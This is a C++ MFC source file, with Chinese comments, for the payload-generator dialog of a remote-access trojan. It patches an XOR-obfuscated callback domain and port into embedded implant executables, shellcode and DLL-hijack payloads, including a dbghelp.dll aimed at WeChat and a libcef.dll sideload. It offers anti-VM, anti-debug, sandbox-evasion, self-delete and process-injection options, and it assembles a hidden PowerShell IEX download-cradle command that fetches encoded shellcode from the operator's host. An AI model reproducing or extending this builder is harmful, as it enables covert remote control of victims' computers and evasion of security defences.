// CGenerate.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CGenerate.h"
#include "afxdialogex.h"
#include"../../struct/info.h"
#include"../shellcode/bhyy.h"
#include"../shellcode/bhyyshellcode.h"
#include"../shellcode/wx.h"
#include"../shellcode/WhiteFile.h"
#include"../shellcode/powershell.h"
//Dat上线结构体
MODIFY_DATA prodll_data = { 0 };
// CGenerate 对话框

unsigned char* powershellLogin = NULL;

typedef struct
{
	TCHAR Shellcode[1200];
	TCHAR File[90 * 1024];
	int  dwFilelen;
}FILEINFO;

IMPLEMENT_DYNAMIC(CGenerate, CDialog)

CGenerate::CGenerate(CWnd* pParent /*=nullptr*/)
	: CDialog(IDD_GENERATE, pParent)
	, m_portVaule(0)
	, m_vipweb(_T(""))
{

}

CGenerate::~CGenerate()
{
}

void CGenerate::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO2, m_InsDir);
	DDX_Control(pDX, IDC_EDIT5, m_Log);
	DDX_Control(pDX, IDC_BUTTON1, m_test);
	DDX_Text(pDX, IDC_EDIT2, m_portVaule);
	DDX_Text(pDX, IDC_EDIT1, m_vipweb);
	DDX_Control(pDX, IDC_MOVE, m_mov);
	DDX_Control(pDX, IDC_COMBO3, m_type);
	DDX_Control(pDX, IDC_MOVE2, m_del);
	DDX_Control(pDX, IDC_MOVE3, m_kill);
	DDX_Control(pDX, IDC_CHECK1, m_threatbook);
	DDX_Control(pDX, IDC_CHECK2, m_vm);
	DDX_Control(pDX, IDC_CHECK3, m_Antidebug);
	DDX_Control(pDX, IDC_MOVE4, m_puppet);
}


BEGIN_MESSAGE_MAP(CGenerate, CDialog)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BUTTON1, &CGenerate::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CGenerate::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_MOVE, &CGenerate::OnBnClickedMove)
	ON_CBN_SELCHANGE(IDC_COMBO3, &CGenerate::OnCbnSelchangeCombo3)
	ON_BN_CLICKED(IDC_BUTTON6, &CGenerate::OnBnClickedButton6)
	ON_BN_CLICKED(IDC_BUTTON7, &CGenerate::OnBnClickedButton7)
	ON_BN_CLICKED(IDC_BUTTON8, &CGenerate::OnBnClickedButton8)
	ON_BN_CLICKED(IDC_BUTTON9, &CGenerate::OnBnClickedButton9)
END_MESSAGE_MAP()


// CGenerate 消息处理程序


BOOL CGenerate::OnInitDialog()
{
	CDialog::OnInitDialog();

	BuildLogOut("服务生成程序正在初始化...");
	//设置信息
	m_portVaule = ((CnbclassApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 6666);
	//设置编辑框信息
	m_vipweb = ((CnbclassApp*)AfxGetApp())->m_IniFile.GetString("Settings", "ip", "127.0.0.1");

	//初始化下拉框
	m_InsDir.InsertString(0, "C:\\windows\\system32");
	m_InsDir.InsertString(1, "C:\\windows");
	m_InsDir.InsertString(2, "C:\\ProgramData");
	m_InsDir.InsertString(3, "C:\\Users\\Public\\Documents");
	m_InsDir.SetCurSel(3);

	m_type.InsertString(0, "exe");
	m_type.InsertString(1, "bin");
	m_type.InsertString(2, "c");
	m_type.SetCurSel(0);

	m_kill.SetCheck(1);
	m_mov.SetCheck(1);
	m_puppet.SetCheck(1);

	BuildLogOut("初始化完成可以生成客户端...");
	BuildLogOut("生成类型为绿色启动...");
	UpdateData(false);
	
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CGenerate::BuildLogOut(CString log)
{
	CString str;
	str = "=> " + log + "....\r\n";
	m_Log.ReplaceSel(str);
}

HBRUSH CGenerate::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT5) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

DWORD WINAPI	CGenerate::TestMaster(LPVOID lparam)
{
	CGenerate* pThis = (CGenerate*)lparam;

	CString	 strResult;
	CString	 strResulr = "连接失败... ";

	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sRemote == SOCKET_ERROR)
	{
		pThis->MessageBox("域名/IP上线-初始化失败... ", "提示...", MB_ICONWARNING);
		pThis->m_test.EnableWindow(TRUE);
		return 0;
	}
	// 设置socket为非阻塞
	u_long argp = 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;

	pHostent = gethostbyname(pThis->m_vipweb.GetBuffer(0));
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	ClientAddr.sin_family = AF_INET;


	ClientAddr.sin_port = htons(pThis->m_portVaule);

	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);
	connect(sRemote, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr));
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);

	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
		goto fail;
	}

fail:
	CString str;
	HOSTENT* host_entry;
	//	char host_name[256] = "zhongjiezhe.xicp.net";//注意这里不要加http://这些前缀
	host_entry = gethostbyname(pThis->m_vipweb.GetBuffer(0));
	if (host_entry != 0)
	{
		str.Format("%d.%d.%d.%d",
			(host_entry->h_addr_list[0][0] & 0x00ff),
			(host_entry->h_addr_list[0][1] & 0x00ff),
			(host_entry->h_addr_list[0][2] & 0x00ff),
			(host_entry->h_addr_list[0][3] & 0x00ff));
	}
	if (bRet)
		strResulr = "连接成功... ";
	strResult.Format("域名/IP  =>上线信息=>\n上线域名=>%s \n解析地址=>%s  \n连接端口=> %d \n连接状态=>%s", pThis->m_vipweb, str, pThis->m_portVaule, strResulr);

	pThis->MessageBox(strResult, strResulr, MB_ICONINFORMATION);

	pThis->m_test.EnableWindow(true);//等待测试完成的时候才激活按钮，避免多次点击卡死的现象

	return 0;
}

//测试
void CGenerate::OnBnClickedButton1()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if (m_vipweb.IsEmpty() || m_portVaule ==0)
	{
		MessageBox("请完整填写域名/IP(1)上线信息...", "提示...", MB_ICONINFORMATION);
		return;
	}
	m_test.EnableWindow(0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, 0);	//启动线程
}

int CGenerate::memfind(const CHAR* mem, const TCHAR* str, int sizem, int sizes)
{

	int da, i, j;
	if (sizes == 0) da = lstrlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;

}

//处理程序
void CGenerate::BuildServer(char* DNS, int port,  char* Path)
{
	memset(&prodll_data, 0, sizeof(prodll_data));

	BuildLogOut("正在组合上线信息....");
	
	strcpy(prodll_data.DNS, DNS);										// 上线域名
	prodll_data.Port = port;													//配置端口
	prodll_data.ismove = m_mov.GetCheck();						//判断是否需要移动文件
	prodll_data.dllorexe = m_type.GetCurSel();					//生成的是exe或者是shellcode
	prodll_data.selfDel =m_del.GetCheck();							//是否自删除
	prodll_data.kill = m_kill.GetCheck();								//自杀
	prodll_data.Uac = 0;														//bypass UAC
	prodll_data.weibu = m_threatbook.GetCheck();				//反微步
	prodll_data.vm = m_vm.GetCheck();								//反虚拟机
	prodll_data.antidebug = m_Antidebug.GetCheck();		//反调试
	prodll_data.puppet = m_puppet.GetCheck();

	CString ReleasePath;	
	m_InsDir.GetWindowTextA(ReleasePath);
	strcpy(prodll_data.ReleasePath, ReleasePath);				// 安装路径
	sprintf(prodll_data.ReleaseName, "%s.exe", "0000");		//安装名称

	for (size_t i = 0; i < sizeof(MODIFY_DATA); i++)
	{
		((PBYTE)&prodll_data)[i] ^= 'a';
	}

	//开始整合信息
	DWORD dwOffset = 0;
	unsigned char* lpDatBuffer = 0;
	DWORD size = 0;
	HANDLE hFile;
	DWORD dwWritten;

	//判断是exe还是shellcode
	if (m_type.GetCurSel() == 0)
	{
		size = sizeof(bhyy);
		lpDatBuffer = (unsigned char*)VirtualAlloc(NULL, sizeof(bhyy), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpDatBuffer)
		{
			CopyMemory(lpDatBuffer, bhyy, size);
			dwOffset = memfind((const char*)lpDatBuffer, "www.kalami.com", size, 0);
			if (dwOffset == -1)
			{
				BuildLogOut("生成失败未找到上线信息....");
				goto end;
			}
			CopyMemory((LPVOID)(lpDatBuffer + dwOffset), (LPCVOID)&prodll_data, sizeof(MODIFY_DATA));
		}
	}
	else
	{
		size = sizeof(bhyyshellcode) + sizeof(MODIFY_DATA)+ 8;
		lpDatBuffer = (unsigned char*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpDatBuffer)
		{
			CopyMemory(lpDatBuffer, bhyyshellcode, sizeof(bhyyshellcode));

			CopyMemory(lpDatBuffer + sizeof(bhyyshellcode), "bhyyinfo", 8);

			CopyMemory(lpDatBuffer + sizeof(bhyyshellcode)+8, (LPCVOID)&prodll_data, sizeof(MODIFY_DATA));
		}
	}

	if (!lpDatBuffer)
	{
		BuildLogOut("内存申请失败....");
		goto end;
	}
	 
	if (m_type.GetCurSel() == 2)
	{
		CString data = "unsigned char buf[] = \n\"";
		DWORD Count = 0;
		CString Tmp;
		for (size_t i = 0; i < size; i++)
		{
			if (Count!= 14)
			{
				Count++;
				Tmp.Format("\\x%02X", lpDatBuffer[i]);
				data += Tmp;
			}
			else
			{
				Count = 0;
				Tmp.Format("\\x%02X\"\r\n\"", lpDatBuffer[i]);
				data += Tmp;
			}
			
		}
		data += "\";";

		//保存文件
		hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, data.GetBuffer(), data.GetLength(), &dwWritten, NULL);
			CloseHandle(hFile);
			//------------------------------------------------------------------------------------------句柄结束
			CString str;
			str.Format("%s [%d]KB", Path, data.GetLength() / 1024);
			BuildLogOut(str);
		}
		else
		{
			BuildLogOut("保存文件失败...");
		}
		
	}
	else
	{
		//保存文件
		hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, lpDatBuffer, size, &dwWritten, NULL);
			CloseHandle(hFile);
			//------------------------------------------------------------------------------------------句柄结束
			CString str;
			str.Format("%s [%d]KB", Path, size / 1024);
			BuildLogOut(str);
		}
		else
		{
			BuildLogOut("保存文件失败...");
		}

	}

end:
	if (lpDatBuffer)
		VirtualFree(lpDatBuffer, 0, MEM_RELEASE);
}

//生成
void CGenerate::OnBnClickedButton2()
{
	CString houzhui;
	CString info;
	if (m_type.GetCurSel() == 0)
	{
		houzhui = "exe";
		info = "可执行文件(*.exe)|*.exe||";
	}
	else if(m_type.GetCurSel() == 1)
	{
		houzhui = "bin";
		info = "bin(*.bin)|*.bin||";
	}
	else
	{
		houzhui = "c";
		info = "c(*.c)|*.c||";
	}

	UpdateData(TRUE);
	BuildLogOut("选择保存位置");
	CString m_DepositSavePath;


	CFileDialog dlg(FALSE, houzhui.GetBuffer(), "mstsc", OFN_OVERWRITEPROMPT, info.GetBuffer(), this);
	if (dlg.DoModal() != IDOK)
	{
		m_Log.SetWindowTextA("");
		BuildLogOut("已暂停服务端生成");
		return;
	}

	m_DepositSavePath = dlg.GetPathName();
	//------------------------------------------------------------------------------------------创建服务端
	BuildServer(m_vipweb.GetBuffer(0), m_portVaule,  m_DepositSavePath.GetBuffer(m_DepositSavePath.GetLength()));

	((CnbclassApp*)AfxGetApp())->m_IniFile.SetString("Settings", "ip", m_vipweb);
	((CnbclassApp*)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_portVaule);
}

//勾选移动文件
void CGenerate::OnBnClickedMove()
{
	if (m_mov.GetCheck())
	{
		m_InsDir.EnableWindow(1);
	}
	else
	{
		m_InsDir.EnableWindow(0);
	}
}

//变动生成类型
void CGenerate::OnCbnSelchangeCombo3()
{
	
		if (m_type.GetCurSel() == 0)
		{
			m_threatbook.EnableWindow(1);
			m_Antidebug.EnableWindow(1);
			m_vm.EnableWindow(1);
		}
		else
		{
			m_threatbook.SetCheck(0);
			m_threatbook.EnableWindow(0);
			m_vm.SetCheck(0);
			m_vm.EnableWindow(0);
			m_Antidebug.SetCheck(0);
			m_Antidebug.EnableWindow(0);
		}
}

//生成劫持DLL
void CGenerate::GenerateDLL(char* name,unsigned char* data,DWORD size,char* sig)
{
	CFileDialog dlg(FALSE, "dll", (char*)name, OFN_OVERWRITEPROMPT, "动态链接库(*.dll)|*.dll||", this);
	if (dlg.DoModal() != IDOK)
	{
		m_Log.SetWindowTextA("");
		BuildLogOut("已暂停服务端生成");
		return;
	}

	UpdateData(TRUE);


	memset(&prodll_data, 0, sizeof(prodll_data));
	strcpy(prodll_data.DNS, m_vipweb.GetBuffer(0));										// 上线域名
	prodll_data.Port = m_portVaule;																	//配置端口
	prodll_data.puppet = m_puppet.GetCheck();
	for (size_t i = 0; i < sizeof(MODIFY_DATA); i++)
	{
		((PBYTE)&prodll_data)[i] ^= 'a';
	}

	char* lpDatBuffer = (char*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpDatBuffer)
	{
		BuildLogOut("内存申请失败....");
		return;
	}
	CopyMemory(lpDatBuffer, data, size);
	DWORD dwOffset = memfind((const char*)lpDatBuffer, sig, sizeof(wx), 0);
	if (dwOffset == -1)
	{
		BuildLogOut("生成失败未找到上线信息....");
		goto end;
	}
	CopyMemory((LPVOID)(lpDatBuffer + dwOffset), (LPCVOID)&prodll_data, sizeof(MODIFY_DATA));

	//保存文件
	HANDLE hFile = CreateFile(dlg.GetPathName(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD dwWritten;
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile, lpDatBuffer, size, &dwWritten, NULL);
		CloseHandle(hFile);
		//------------------------------------------------------------------------------------------句柄结束
		CString str;
		str.Format("%s [%d]KB", dlg.GetPathName(), size / 1024);
		BuildLogOut(str);
	}
	else
	{
		BuildLogOut("保存文件失败...");
	}

end:
	if (lpDatBuffer)
		VirtualFree(lpDatBuffer, 0, MEM_RELEASE);
}

//生成微信劫持
void CGenerate::OnBnClickedButton6()
{
	GenerateDLL("dbghelp",wx,sizeof(wx), "www.kalami.com");
}

//白文件上线
void CGenerate::OnBnClickedButton7()
{

	CFileDialog dlg(FALSE, "exe", 0, OFN_OVERWRITEPROMPT, "可执行文件(*.exe)|*.exe||", this);
	if (dlg.DoModal() != IDOK)
	{
		m_Log.SetWindowTextA("");
		BuildLogOut("已暂停服务端生成");
		return;
	}

	//保存文件
	HANDLE hFile = CreateFile(dlg.GetPathName(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD dwWritten;
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile, WhiteExe, sizeof(WhiteExe), &dwWritten, NULL);
		CloseHandle(hFile);
		//------------------------------------------------------------------------------------------句柄结束
		CString str;
		str.Format("%s [%d]KB", dlg.GetPathName(), sizeof(WhiteExe) / 1024);
		BuildLogOut(str);
	}
	else
	{
		BuildLogOut("保存文件失败...");
	}
	GenerateDLL("libcef", WhiteDll, sizeof(WhiteDll), "www.kalami.com");
}

//生成dll
void CGenerate::OnBnClickedButton8()
{
	GenerateDLL("test", bhyydll, sizeof(bhyydll),"www.kalami.com");
}

//base64加密
unsigned char* CGenerate::base64_encode(unsigned char* str, DWORD str_len)
{
	long len;
	unsigned char* res;
	int i, j;
	//定义base64编码表  
	unsigned char* base64_table = (unsigned char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	//计算经过base64编码后的字符串长度  
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (unsigned char*)LocalAlloc(LPTR, sizeof(unsigned char) * len + 1);
	res[len] = '\0';
	//以3个8位字符为一组进行编码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
	}
	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	return res;
}

//命令设置到粘贴板
BOOL CGenerate::SetComd(char* buff,DWORD size)
{
	BOOL  result = FALSE;
	HGLOBAL hmem = NULL;
	if (OpenClipboard()) //是否成功打开剪帖板
	{
		if (EmptyClipboard())//清空成功，则继续
		{
			hmem = GlobalAlloc(GHND, size);//memalloc strlen+1 \0
			char* pmem = (char*)GlobalLock(hmem);
			memcpy(pmem, buff, size);
			SetClipboardData(CF_TEXT, hmem);
			GlobalUnlock(hmem);
			result = TRUE;
		}
		//关闭剪贴板
		CloseClipboard();
	}
	return result;
}

//命令上线
void CGenerate::OnBnClickedButton9()
{
	UpdateData(TRUE);

	if (powershellLogin != NULL)
	{
		LocalFree(powershellLogin);
		powershellLogin = NULL;
	}

	memset(&prodll_data, 0, sizeof(prodll_data));
	strcpy(prodll_data.DNS, m_vipweb.GetBuffer(0));										// 上线域名
	prodll_data.Port = m_portVaule;														//配置端口
	for (size_t i = 0; i < sizeof(MODIFY_DATA); i++)
	{
		((PBYTE)&prodll_data)[i] ^= 'a';
	}

	CString code;
	//组合shellcode
	DWORD size = sizeof(bhyyshellcode) + sizeof(MODIFY_DATA) + 8;
	unsigned char* lpDatBuffer = (unsigned char*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpDatBuffer)
	{
		CopyMemory(lpDatBuffer, bhyyshellcode, sizeof(bhyyshellcode));
		CopyMemory(lpDatBuffer + sizeof(bhyyshellcode), "bhyyinfo", 8);
		CopyMemory(lpDatBuffer + sizeof(bhyyshellcode) + 8, (LPCVOID)&prodll_data, sizeof(MODIFY_DATA));

		//简单加密shellcode
		for (size_t i = 0; i < size; i++)
		{
			lpDatBuffer[i] ^= 88;
		}
		//shellcode 编码
		unsigned char* encodeshellcode = base64_encode(lpDatBuffer, size);
		VirtualFree(lpDatBuffer, 0, MEM_RELEASE);
		//拼接shellcode
		code.Format("%s%s%s", scriptUp, encodeshellcode,scriptDown);
		LocalFree(encodeshellcode);
		//二次加密
		powershellLogin = base64_encode((unsigned char*)code.GetBuffer(), code.GetLength());
		
		//提示上线命令
		code.Format("%s -nop -w hi%sen -c \"%sdownloa%s//%s:%d/Ymh5eQ=='))\"", "powershell.exe", "dd", "IEX((new-object net.webclient).", "dstring('http:", m_vipweb.GetBuffer(0), m_portVaule);
		if (SetComd(code.GetBuffer(), code.GetLength()+1))
		{
			MessageBoxA("命令已复制到粘贴板", "提示");
		}
		else
		{
			MessageBoxA(code, "执行命令上线");
		}
		
	}

}
